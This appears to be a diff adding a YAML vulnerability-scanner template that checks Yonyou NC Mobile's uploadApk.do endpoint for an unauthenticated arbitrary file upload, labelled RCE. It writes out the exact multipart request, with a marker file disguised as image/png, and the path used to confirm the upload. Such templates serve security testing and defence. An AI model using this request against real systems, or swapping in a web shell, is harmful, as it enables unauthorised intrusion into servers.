@@ -1,0 +1,21 @@
+name: poc-yaml-nc-mobile-uploadapk-rce
+rules:
+    - method: POST
+      path: /maportal/appmanager/uploadApk.do?pk_obj=
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOsFdO3B4JsHoXgod
+      body: "------WebKitFormBoundaryOsFdO3B4JsHoXgod\r\nContent-Disposition: form-data; name=\"downloadpath\"; filename=\"1314520.txt\"\r\nContent-Type: image/png\r\n\r\n1314520\r\n------WebKitFormBoundaryOsFdO3B4JsHoXgod--"
+      follow_redirects: false
+      expression: |
+        response.status == 200 && response.body.bcontains(b'{"status":2}')
+    - method: GET
+      path: /maupload/apk/1314520.txt
+      follow_redirects: false
+      expression: |
+        response.status == 200 && response.body.bcontains(b'1314520')
+        
+detail:
+    author: nc-mobile-uploadapk-rce
+    links:
+        - app="用友-移动系统管理"
+
